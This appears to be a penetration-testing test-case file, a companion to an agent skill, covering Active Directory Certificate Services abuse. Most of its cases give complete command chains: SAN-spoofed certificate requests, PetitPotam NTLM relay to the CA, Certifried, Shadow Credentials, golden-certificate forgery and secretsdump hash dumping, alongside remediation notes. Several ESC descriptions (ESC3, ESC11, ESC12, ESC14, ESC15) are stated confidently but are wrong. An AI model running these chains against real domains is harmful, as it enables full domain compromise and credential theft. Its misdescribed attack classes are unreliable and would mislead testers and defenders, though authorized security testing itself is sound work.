# Active Directory Certificate Services (AD CS) Abuse Test Cases

> This file is a companion to `SKILL.md`, providing structured test case templates for AD CS attack scenarios.
> Purpose: Check each item during penetration testing to ensure no critical ESC paths are missed. Each case includes prerequisites, steps, expected results, severity level, and remediation.
> All tests are intended solely for **authorized security assessments** with a signed statement of work.

---

## Test Case Format

```
TC-ACXXX | [Category] Test Name
Severity: CRITICAL / HIGH / MEDIUM / LOW
Prerequisites: Conditions that must be met before testing
Test Steps: Specific operations
Expected Results: Observable behavior when the vulnerability exists
Remediation: Recommended defensive actions
Pass Criteria: How to verify the test succeeded
Reference Payload: Corresponding section in payloads.md
```

---

## Index

- [A. PKI Reconnaissance and Discovery](#a-pki-reconnaissance-and-discovery)
- [B. ESC1-ESC7 -- Template / CA ACL Abuse](#b-esc1-esc7----template--ca-acl-abuse)
- [C. ESC8 / ESC11 -- NTLM Relay to AD CS](#c-esc8--esc11----ntlm-relay-to-ad-cs)
- [D. ESC9 / ESC10 -- Weak Certificate Mapping](#d-esc9--esc10----weak-certificate-mapping)
- [E. Advanced Patterns -- ESC12 through ESC15](#e-advanced-patterns--esc12-through-esc15)
- [F. CVE-Specific and Persistence Attacks](#f-cve-specific-and-persistence-attacks)

---

## A. PKI Reconnaissance and Discovery

### TC-AC001 | AD CS CA Discovery via LDAP Configuration Partition

- **Severity**: MEDIUM
- **Objective**: Identify every Enterprise and Standalone Certificate Authority in the target forest through LDAP queries against the Configuration naming context, including CA names, host names, and published templates.
- **Prerequisites**:
  - Network access to the target domain controller LDAP port (389 or 636)
  - Valid low-privileged domain credentials (any domain user)
  - Domain name and at least one DC IP identified
  - Kali Linux with `ldapsearch` installed
- **Test Steps**:
  1. Bind to LDAP and locate the Configuration partition: `ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' -b "" -s base namingcontexts`
  2. Query the Enrollment Services container for all Enterprise CAs: `ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectclass=pKIEnrollmentService)" cn dNSHostName certificateTemplates`
  3. Query the Certification Authorities container for trusted root CAs: `ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' -b "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectclass=certificationAuthority)" cn cACertificate`
  4. Query the NTAuthCertificates object: `ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectclass=certificationAuthority)"`
  5. Probe for Web Enrollment endpoints: `curl -sk -I http://ca01.corp.local/certsrv/`
- **Expected Result**: At least one Enterprise CA is identified with a known DNS hostname, the CA's published template list is enumerated, the NTAuthCertificates object lists the CA as authorised to issue client-authentication certificates, and the Web Enrollment endpoint (if present) is reachable.
- **Remediation**: Restrict anonymous LDAP queries, restrict access to the Configuration partition to authenticated users only, disable Web Enrollment if not required, and audit LDAP query patterns against the Configuration partition.
- **Pass Criteria**: Test passes when the CA's CN, FQDN, and at least 5 published templates are successfully enumerated. Verification includes confirming the Web Enrollment endpoint's HTTP response code (200 = enabled, 404 = disabled).
- **Reference**: payloads.md Section 1 -- PKI Reconnaissance and CA Discovery

---

### TC-AC002 | AD CS Template Enumeration and ESC Classification

- **Severity**: HIGH
- **Objective**: Enumerate every published certificate template and classify each against the ESC1-ESC15 matrix based on flags, EKUs, ACLs, and CA-level configuration.
- **Prerequisites**:
  - Valid domain credentials (any authenticated user)
  - Network access to LDAP (389/636) on the DC
  - Network access to RPC (135 + dynamic) on the CA if enumerating via ICPR
  - `certipy` (ly4k fork) installed on Kali
- **Test Steps**:
  1. Run `certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -vulnerable -text -json`
  2. Parse the resulting JSON for templates where `ESC1` is true (flag combination: `ENROLLEE_SUPPLIES_SUBJECT` set + Client Auth EKU + requester can enroll + no manager approval)
  3. Cross-reference with the CA's EditFlags output to detect ESC6 (`EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` set on the CA)
  4. Inspect template ACLs for ESC4 candidates (any non-admin principal with WriteDacl/WriteOwner/GenericAll)
  5. Inspect CA ACLs for ESC5/ESC7 candidates (non-admins with ManageCA/ManageCertificates)
  6. Verify results against a parallel `Certify.exe find /vulnerable` run from a Windows foothold
- **Expected Result**: A classified matrix of every template showing which ESC pattern(s) apply. At least one vulnerable template or CA-level misconfiguration is identified (typical of real-world environments).
- **Remediation**: Run periodic PSPKIAudit or Certipy scans. Establish a baseline of expected templates and alert on new template creation or ACL change. Remove unnecessary templates entirely.
- **Pass Criteria**: Test passes when the full template list is enumerated AND the ESC1-ESC15 classification matches between Certipy (Kali) and Certify (Windows). At least one finding must be reproducible end-to-end.
- **Reference**: payloads.md Section 2 -- Template Enumeration and ESC Classification

---

## B. ESC1-ESC7 -- Template / CA ACL Abuse

### TC-AC003 | ESC1 -- SubjectAltName (SAN) Abuse via ENROLLEE_SUPPLIES_SUBJECT

- **Severity**: CRITICAL
- **Objective**: Demonstrate that a misconfigured certificate template with `ENROLLEE_SUPPLIES_SUBJECT` allows a low-privileged user to request a certificate authenticating as any principal in the forest (typically administrator or a Domain Controller).
- **Prerequisites**:
  - Valid low-privileged domain credentials
  - Identified ESC1-vulnerable template from TC-AC002
  - Network access to RPC (135 + dynamic) on the CA
  - Network access to Kerberos (88) on the DC for PKINIT
- **Test Steps**:
  1. Identify the ESC1 template: `certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -vulnerable | grep -A5 ESC1`
  2. Request a certificate with SAN=administrator: `certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -ca 'CORP-CA01-CA' -template 'VulnTemplate' -san 'administrator@corp.local'`
  3. Verify the issued certificate: `openssl pkcs12 -in administrator.pfx -nocerts -nodes -passin pass: | openssl x509 -text -noout | grep -A5 'Subject Alternative Name'`
  4. Authenticate via PKINIT: `certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1`
  5. Use the TGT: `KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass dc01.corp.local`
- **Expected Result**: A PFX is issued containing the SAN `administrator@corp.local`. PKINIT produces a TGT for the Administrator account. Secretsdump extracts domain hashes, confirming Domain Admin equivalence.
- **Remediation**: Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x1) from any template with Client Authentication / PKINIT / Smart Card Logon EKU via `certutil -setreg` or template re-creation. Apply KB5014754 and set `StrongCertificateBindingEnforcement = 2` (Full Enforce). Restrict template enrollment to narrowly-scoped groups.
- **Pass Criteria**: Test passes when the resulting TGT is for the Administrator account (not the requesting user) AND the secretsdump output contains domain hashes (krbtgt, Administrator, etc.). Failure modes: cert request rejected (template not actually ESC1), PKINIT rejected (strong mapping enforced), TGT obtained but secretsdump fails (DC SMB signing).
- **Reference**: payloads.md Section 3 -- ESC1 SAN Abuse

---

### TC-AC004 | ESC3 -- PKINIT KDC EKU Impersonation

- **Severity**: CRITICAL
- **Objective**: Demonstrate that a template with the PKINIT KDC EKU (`1.3.6.1.5.2.3.5`) and ENROLLEE_SUPPLIES_SUBJECT allows impersonation of a Domain Controller, granting the attacker DCSync-equivalent access.
- **Prerequisites**:
  - Valid low-privileged domain credentials
  - Identified ESC3 template (PKINIT KDC EKU + ENROLLEE_SUPPLIES_SUBJECT + requester can enroll)
  - Network access to the CA RPC and DC Kerberos
- **Test Steps**:
  1. Identify the ESC3 template: `ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(pKIExtendedKeyUsage=1.3.6.1.5.2.3.5)"`
  2. Request a cert impersonating a DC: `certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -ca 'CORP-CA01-CA' -template 'KdcTemplate' -san 'DC01$' -upn 'DC01$@corp.local'`
  3. Verify the cert EKU: `openssl pkcs12 -in dc01.pfx -nocerts -nodes -passin pass: | openssl x509 -text -noout | grep -A5 'Extended Key Usage'`
  4. PKINIT as the DC: `certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1`
  5. Use the DC TGT for LDAP shell / secretsdump: `KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local`
- **Expected Result**: A certificate with PKINIT KDC EKU is issued for DC01$. PKINIT produces a TGT for the DC01$ machine account. Secretsdump via the DC TGT succeeds.
- **Remediation**: Remove the PKINIT KDC EKU from any template enrollable by non-DC principals. Restrict the DomainController template to the `Domain Controllers` group only. Apply KB5014754 strong mapping enforcement.
- **Pass Criteria**: Test passes when PKINIT yields a TGT for DC01$ (not the requester) AND secretsdump returns domain hashes. Note: this test should be the highest-priority finding in the engagement report.
- **Reference**: payloads.md Section 5 -- ESC3 PKINIT KDC Abuse

---

### TC-AC005 | ESC4 -- Template ACL Modification (WriteDacl Abuse)

- **Severity**: CRITICAL
- **Objective**: Demonstrate that a principal holding `WriteDacl` / `WriteOwner` / `GenericAll` / `WriteProperty` on a template can modify it to be ESC1-equivalent, then enroll to escalate privileges.
- **Prerequisites**:
  - Valid domain credentials with write permission on the target template
  - Identified ESC4-vulnerable template from TC-AC002
  - Network access to LDAP and CA RPC
- **Test Steps**:
  1. Verify write permission: `certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -text | grep -B2 -A5 'ESC4'`
  2. Save the current template state: `certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -template 'WritableTemplate' -save-old`
  3. Modify the template to be ESC1-equivalent: `certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -template 'WritableTemplate' -configuration 'WritableTemplate.json'`
  4. Request a cert with SAN=administrator: `certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -ca 'CORP-CA01-CA' -template 'WritableTemplate' -san 'administrator@corp.local'`
  5. PKINIT and verify Domain Admin equivalence
  6. Restore the template state: `certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -template 'WritableTemplate' -configuration 'WritableTemplate.json.old'`
- **Expected Result**: After modification, the template issues certificates with attacker-supplied SAN. The escalation succeeds as if it were a native ESC1 template. Restoration returns the template to its original state.
- **Remediation**: Audit template ACLs quarterly. Remove `GenericAll`, `WriteDacl`, `WriteOwner`, and `WriteProperty` on `msPKI-Certificate-Name-Flag` from any non-admin principal. Alert on any ACL change to template objects (Event ID 5136).
- **Pass Criteria**: Test passes when (a) the modification succeeds, (b) the resulting cert SAN=administrator, (c) PKINIT yields an Administrator TGT, and (d) the restoration succeeds (compare the template state before and after via `certutil -catemplates`).
- **Reference**: payloads.md Section 6 -- ESC4 Template ACL Abuse

---

### TC-AC006 | ESC6 -- EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 CA Flag Abuse

- **Severity**: HIGH (CRITICAL pre-KB5014754, MEDIUM post-KB5014754)
- **Objective**: Demonstrate that a CA with the `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` flag set will honour SAN values on any template, regardless of the template's `ENROLLEE_SUPPLIES_SUBJECT` flag.
- **Prerequisites**:
  - Valid domain credentials
  - Identified CA with the EDITF flag set (via TC-AC002)
  - Network access to CA RPC and DC Kerberos
- **Test Steps**:
  1. Verify the flag: `certutil -config \\CA01\CORP-CA01-CA -getreg policy\\EditFlags` (look for EDITF_ATTRIBUTESUBJECTALTSSUBJECT2)
  2. Request a cert against the default User template with SAN=administrator: `certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -ca 'CORP-CA01-CA' -template 'User' -san 'administrator@corp.local'`
  3. Verify the cert has the SAN: `openssl x509 -in admin.pem -text -noout | grep -A3 'Subject Alternative Name'`
  4. PKINIT: `certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1`
  5. Check post-KB5014754 mitigation status: `reg query \\\\dc01\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kerberos\\Parameters /v StrongCertificateBindingEnforcement`
- **Expected Result**: On pre-KB5014754 environments or Audit mode, the certificate is issued with the SAN and PKINIT succeeds. On Full Enforce mode, PKINIT fails with strong-mapping rejection.
- **Remediation**: Disable the flag: `certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` then restart the CA service. Apply KB5014754 and move to Full Enforce mode (`StrongCertificateBindingEnforcement = 2`).
- **Pass Criteria**: Test passes when the issued certificate contains the SAN field (the flag is active). The PKINIT outcome depends on the strong-mapping mode -- record both findings separately.
- **Reference**: payloads.md Section 8 -- ESC6 EDITF Flag Abuse

---

## C. ESC8 / ESC11 -- NTLM Relay to AD CS

### TC-AC007 | ESC8 -- PetitPotam to AD CS Web Enrollment Relay Chain

- **Severity**: CRITICAL
- **Objective**: From an unauthenticated network position, demonstrate the full PetitPotam to AD CS to Domain Admin chain: coerce DC authentication, relay to Web Enrollment, obtain DC cert, PKINIT, dump credentials.
- **Prerequisites**:
  - Network access to the DC (SMB + Kerberos)
  - Network access to the CA's HTTP endpoint
  - Network access from the DC to the attacker's relay listener
  - Identified Web Enrollment endpoint (TC-AC001)
  - Patch level: pre-August 2021 (anonymous PetitPotam) OR valid credentials (authenticated PetitPotam)
- **Test Steps**:
  1. Start ntlmrelayx on the attacker's relay host: `ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'`
  2. From a separate terminal, coerce the DC: `python3 PetitPotam.py -u '' -p '' -d corp.local 10.10.0.100 10.10.0.1` (replace 10.10.0.100 with attacker IP, 10.10.0.1 with DC IP)
  3. Observe the relay output -- the base64-encoded PFX is printed
  4. Save the PFX: `echo '<base64_pfx>' | base64 -d > dc01.pfx`
  5. PKINIT: `certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1`
  6. DCSync via the DC TGT: `KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local`
- **Expected Result**: Within seconds of the PetitPotam trigger, ntlmrelayx prints the DC cert. PKINIT yields a TGT for DC01$. Secretsdump dumps all domain hashes.
- **Remediation**: Disable Web Enrollment entirely (preferred). If required, enable Extended Protection for Authentication (EPA) with Channel Binding Tokens on the `certsrv` IIS application. Apply August 2021 patches (CVE-2021-36942). Block SMB outbound from DCs to non-DC hosts at the firewall. Block MS-EFSRPC at the DC host firewall.
- **Pass Criteria**: Test passes when (a) ntlmrelayx successfully relays to the CA and obtains a PFX, (b) PKINIT produces a DC TGT, and (c) secretsdump returns at least 10 user hashes from the domain. Document the elapsed time from trigger to hash dump (typically under 30 seconds).
- **Reference**: payloads.md Section 10 -- ESC8 NTLM Relay + payloads.md Section 18 -- PetitPotam

---

### TC-AC008 | ESC11 -- Relay to ICPR (RPC over HTTP)

- **Severity**: CRITICAL
- **Objective**: Demonstrate that even with Web Enrollment disabled, the ICPR (ICertPassage) RPC interface on the CA can be used as a relay target for the same coercion-based attack.
- **Prerequisites**:
  - Web Enrollment disabled (or EPA enforced, blocking ESC8)
  - ICPR RPC interface exposed on the CA (port 135 + dynamic)
  - Network access from the DC to the attacker's relay host
  - Patch level: pre-August 2021 OR valid domain credentials
- **Test Steps**:
  1. Verify ICPR exposure: `rpcclient -U 'CORP\\svc_ldap%Password123!' ca01.corp.local -c 'enumif' 2>&1 | grep -i 'ICertPassage'`
  2. Start ntlmrelayx targeting ICPR: `ntlmrelayx.py -t rpc://ca01.corp.local -smb2support --rpc-mode ICPR --ca CORP-CA01-CA`
  3. Coerce the DC: `python3 PetitPotam.py -u 'svc_ldap' -p 'Password123!' -d corp.local 10.10.0.100 10.10.0.1`
  4. Use the resulting PFX: `certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1`
  5. Verify Domain Admin equivalence via secretsdump
- **Expected Result**: The ICPR relay succeeds even though Web Enrollment is disabled. A DC cert is obtained. PKINIT and secretsdump succeed as in TC-AC007.
- **Remediation**: Enforce RPC encryption on the CA: `certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICSPREQUEST`. Block unauthenticated RPC to the CA at the host firewall. Apply the same mitigations as ESC8 (patching, SMB outbound blocking).
- **Pass Criteria**: Test passes when ntlmrelayx with `--rpc-mode ICPR` successfully relays and obtains a PFX. The PKINIT outcome should match TC-AC007.
- **Reference**: payloads.md Section 13 -- ESC11 Relay to ICPR

---

## D. ESC9 / ESC10 -- Weak Certificate Mapping

### TC-AC009 | ESC9/ESC10 -- Strong Mapping Bypass on Audit Mode

- **Severity**: HIGH
- **Objective**: Demonstrate that with `StrongCertificateBindingEnforcement = 1` (Audit mode, the default pre-November 2023), certificates with weak SID binding can be used for impersonation that would be blocked under Full Enforce mode.
- **Prerequisites**:
  - DC at patch level between August 2021 (KB5005413) and November 2023 (Full Enforce enforcement)
  - Valid domain credentials
  - Identified template that issues certificates with mismatched SubjectSid / no security extension
- **Test Steps**:
  1. Check the strong-mapping mode: `reg query \\\\dc01\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kerberos\\Parameters /v StrongCertificateBindingEnforcement` (expect `0x1` = Audit, `0x2` = Enforce)
  2. Request a cert against a template with weak SID binding (or forge via ESC4 / ESC5 modification): `certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -ca 'CORP-CA01-CA' -template 'WeakBindingTemplate' -upn 'administrator@corp.local'`
  3. PKINIT: `certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1`
  4. Check the DC's Event Log for Event ID 4768 with pre-auth type 16 (PKINIT) and Event ID 47 (strong-mapping audit warning, if enabled)
  5. Verify Administrator-equivalent access via secretsdump
- **Expected Result**: In Audit mode, PKINIT succeeds (with a warning event). In Enforce mode, PKINIT fails with `KDC_ERR_CLIENT_NAME_MISMATCH` or similar.
- **Remediation**: Set `StrongCertificateBindingEnforcement = 2` (Full Enforce) via Group Policy. Schedule the change for after November 2023 enforcement deadline. Document the audit events to identify certificates that will break.
- **Pass Criteria**: Test passes when PKINIT succeeds in Audit mode AND fails in Enforce mode (toggle the registry value between tests). Record both states for the report.
- **Reference**: payloads.md Section 11 -- ESC9 + payloads.md Section 12 -- ESC10

---

## E. Advanced Patterns -- ESC12 through ESC15

### TC-AC010 | ESC12 / ESC13 / ESC14 / ESC15 -- Advanced ESC Pattern Verification

- **Severity**: HIGH
- **Objective**: Verify the presence of advanced ESC patterns catalogued after the original "Certified Pre-Owned" paper: ESC12 (MachineCertificateEdition), ESC13 (issuance policy to group mapping), ESC14 (AIA URL manipulation), ESC15 (lua application EKU, CVE-2024-49019).
- **Prerequisites**:
  - Valid domain credentials
  - CA patched through at least May 2022 (the advanced patterns often require specific template configurations to be exploitable)
  - Domain Controller running Windows Server 2019 or later
- **Test Steps**:
  1. **ESC12**: Enumerate machine templates with `MachineCertificateEdition = 0`: `ldapsearch ... -b "CN=Certificate Templates,..." "(objectclass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag` -- a machine template missing the MachineCertificateEdition attribute may issue User-edition certs
  2. **ESC13**: Enumerate issuance policy OIDs and their group mappings: `ldapsearch ... -b "CN=OID,CN=Public Key Services,..." "(objectclass=msPKI-Enterprise-Oid)" cn msPKI-Cert-Application-Oid`; then check for Group Policy issuance policy to security group mapping
  3. **ESC14**: Check templates and CA for attacker-controlled AIA URLs: `certutil -config \\CA01\CORP-CA01-CA -getreg CA\\AIA` and inspect each template's AIA extension
  4. **ESC15**: Enumerate templates with the lua application EKU (`1.3.6.1.4.1.311.95.1.1`): `ldapsearch ... "(pKIExtendedKeyUsage=1.3.6.1.4.1.311.95.1.1)"`
  5. For each finding, attempt the request: ESC13 `certipy req -ca 'CORP-CA01-CA' -template 'HighPrivPolicyTemplate'`; ESC15 `certipy req -ca 'CORP-CA01-CA' -template 'LuaEKUTemplate' -san 'administrator@corp.local'`
- **Expected Result**: Any of the four patterns found represents a finding. The most impactful is typically ESC13 (group-mapped issuance policy). ESC15 bypasses strong mapping on unpatched targets (CVE-2024-49019 patch missing).
- **Remediation**: ESC12 -- set MachineCertificateEdition correctly on all machine templates. ESC13 -- audit and remove issuance policy to high-privilege group mappings. ESC14 -- remove attacker-controllable AIA URLs and restrict template ACLs. ESC15 -- apply the CVE-2024-49019 patch.
- **Pass Criteria**: Test passes when at least one of ESC12/ESC13/ESC14/ESC15 is identified AND the exploitation is reproducible (e.g., ESC15 SAN impersonation works). Document each pattern separately in the report.
- **Reference**: payloads.md Sections 14-17 -- ESC12 through ESC15

---

## F. CVE-Specific and Persistence Attacks

### TC-AC011 | CVE-2022-26923 (Certifried) -- Machine dNSHostName Collision

- **Severity**: CRITICAL
- **Objective**: Demonstrate that an authenticated attacker can create a machine account, patch its `dNSHostName` to collide with a Domain Controller, and obtain a certificate that authenticates as the DC.
- **Prerequisites**:
  - Valid domain credentials (any domain user, with MAQ > 0)
  - CA not patched against CVE-2022-26923 (pre-May 2022 CU)
  - Network access to LDAP, CA RPC, DC Kerberos
- **Test Steps**:
  1. Create a machine account: `impacket-addcomputer corp.local/svc_ldap:Password123! -computer-name 'EVIL$' -computer-pass 'EvilPass123!'`
  2. Patch the dNSHostName to collide with a DC: `certipy account update -u 'corp\\EVIL$' -p 'EvilPass123!' -dc-ip 10.10.0.1 -dns 'dc01.corp.local'`
  3. Request a machine certificate: `certipy req -u 'corp\\EVIL$' -p 'EvilPass123!' -dc-ip 10.10.0.1 -ca 'CORP-CA01-CA' -template 'Machine'`
  4. PKINIT as DC01$: `certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1`
  5. DCSync: `KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local`
- **Expected Result**: On unpatched CAs, the cert is issued with the DC's DNS hostname in the subject. PKINIT yields a TGT for the DC machine account. Secretsdump dumps all domain hashes.
- **Remediation**: Apply May 2022 patches to all CAs (the patch adds dNSHostName collision detection). Restrict MAQ (Machine Account Quota) to 0 for non-admin users. Audit `dNSHostName` changes (Event ID 5136 on computer objects).
- **Pass Criteria**: Test passes when (a) the machine account is created, (b) the dNSHostName is patched (no SPN collision error from the DC), (c) the cert is issued, (d) PKINIT yields a DC TGT, and (e) secretsdump returns domain hashes. Document the patch status of the target CA.
- **Reference**: payloads.md Section 20 -- Certifried CVE-2022-26923

---

### TC-AC012 | Shadow Credentials -- msDS-KeyCredentialLink Persistence

- **Severity**: CRITICAL
- **Objective**: Demonstrate that write access to a target's `msDS-KeyCredentialLink` attribute grants persistent cert-based access that survives password resets, by writing an attacker-controlled public key and authenticating via PKINIT.
- **Prerequisites**:
  - Valid domain credentials with `GenericWrite` (or equivalent write permission on the target)
  - Target DC running Windows Server 2016 or later (PKINIT for user/computer accounts)
  - Network access to LDAP and Kerberos
  - `pywhisker` installed on Kali
- **Test Steps**:
  1. Identify write targets via BloodHound: `MATCH (u:User {name:'CORP\\SVC_LDAP'}), (t) WHERE (u)-[:GenericWrite]->(t) RETURN t.name` -- candidate targets include users, computers, and service accounts
  2. Add a KeyCredentialLink to the target: `pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' --target 'DC01$' --action 'add'`
  3. Verify the KeyCredentialLink: `pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' --target 'DC01$' --action 'list'`
  4. PKINIT as the target: `certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1`
  5. Verify the access works: `KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local`
  6. Simulate a password reset on the target (if a user) and re-test PKINIT -- it should still work
  7. Remove the KeyCredentialLink for cleanup: `pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' --target 'DC01$' --action 'remove' --device-id '<KeyId>'`
- **Expected Result**: A KeyCredentialLink is written. PKINIT yields a TGT for DC01$ (or the target). The TGT works for secretsdump / lateral movement. The persistence survives password resets of the target account.
- **Remediation**: Audit ACLs for `GenericWrite` / `WriteAccountRestrictions` and remove unnecessary grants. Deploy Microsoft Defender for Identity which raises a "Suspicious modification of a KeyCredentialLink" alert. Monitor Event ID 4662 on the `msDS-KeyCredentialLink` attribute (GUID `5cb47ed8-8b67-4947-b91e-5f6e0bbe2c1a`).
- **Pass Criteria**: Test passes when (a) the KeyCredentialLink write succeeds, (b) PKINIT yields a TGT for the target principal, (c) the TGT grants the target's privileges, and (d) re-authentication works after a password reset. Document the ACL path that granted the write permission.
- **Reference**: payloads.md Section 21 -- Shadow Credentials

---

## Optional Additional Test Cases

The following cases are optional based on engagement scope:

### TC-AC013 (Optional) | Golden Certificate Forgery from Extracted CA Key

- **Severity**: CRITICAL
- **Objective**: Demonstrate that with the CA private key, an attacker can forge certificates offline that are indistinguishable from legitimate ones to PKINIT, while leaving no trace in the CA database.
- **Prerequisites**:
  - Compromised CA server (Domain Admin equivalent)
  - Extracted CA private key (PFX export or `certsrv.edb` database access)
- **Test Steps**:
  1. Backup the CA key: `certutil -backupkey -p 'BackupPass!' C:\CA-Backup\` then transfer the PFX to Kali
  2. Forge a cert for administrator: `certipy forge -ca-pfx ca.pfx -upn 'administrator@corp.local' -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'`
  3. PKINIT: `certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.0.1`
  4. Forensic verification: query the CA database for the forged serial number -- it will NOT appear (the detection indicator)
- **Reference**: payloads.md Section 22 -- Golden Certificate Forgery

### TC-AC014 (Optional) | AD CS Web Enrollment Enumeration

- **Severity**: MEDIUM
- **Objective**: Enumerate the Web Enrollment endpoint's exposed information and capabilities (templates, CA info, supported request types) without enrolling.
- **Test Steps**:
  1. Browse the Web Enrollment UI: `curl -sk --ntlm -u 'CORP\\svc_ldap:Password123!' http://ca01.corp.local/certsrv/default.asp`
  2. Enumerate available templates via the UI: parse the HTML for the `<select name="lbCertTemplatesList">` options
  3. Check the EPA status: `curl -sk -I --ntlm -u 'CORP\\svc_ldap:Password123!' http://ca01.corp.local/certsrv/ | grep -i 'WWW-Authenticate'`
- **Reference**: payloads.md Section 1 -- Web Enrollment Probing

### TC-AC015 (Optional) | NDES / SCEP Endpoint Enumeration

- **Severity**: MEDIUM
- **Objective**: Identify and enumerate the NDES (Network Device Enrollment Service) endpoint, potentially extracting the enrollment challenge password.
- **Test Steps**:
  1. Probe the NDES endpoint: `curl -sk http://ca01.corp.local/certsrv/mscep/mscep.dll`
  2. If the NDES admin password is rotated hourly, attempt to extract it from the IIS app pool (requires CA server access)
- **Reference**: payloads.md Section 30 -- NDES / SCEP Abuse

---

## Reporting Guidelines

For each finding in the engagement report, include:

1. **Risk Rating** -- Use the severity from the test case
2. **Description** -- What was found, in business terms
3. **Affected Component** -- Specific CA name, template name, ACL path
4. **Reproduction Steps** -- Numbered commands from this file
5. **Evidence** -- Screenshots / log excerpts / output captures
6. **Impact** -- What an attacker could do (Domain Admin, persistence, etc.)
7. **Remediation** -- Specific commands and config changes
8. **Reference** -- CVE, KB article, SpecterOps paper section

For CRITICAL findings (typically TC-AC003 through TC-AC012), produce a separate Executive Summary slide highlighting:
- Time-to-compromise (typically under 60 seconds for ESC8 / ESC11 chains)
- Patch status of relevant CVEs
- Strategic recommendations (HSM, three-tier hierarchy, strong mapping enforcement)

---

## Final Notes

- **Authorization**: Every test case assumes a signed engagement letter authorising the testing. Do not run these against systems you do not own or have explicit permission to test.
- **Lab Validation**: Run every test case in a controlled lab (Appendix F of payloads.md) before production testing.
- **Logging**: Maintain detailed logs of every command for the engagement report and for the defender's post-engagement validation.
- **Patch Awareness**: Track the patch status of PetitPotam (CVE-2021-36942), Certifried (CVE-2022-26923), and ESC15 (CVE-2024-49019). Patched targets require alternative paths.
- **Defender Coordination**: Notify the blue team of testing windows. Coordinate detection rule validation as a value-add for both sides.
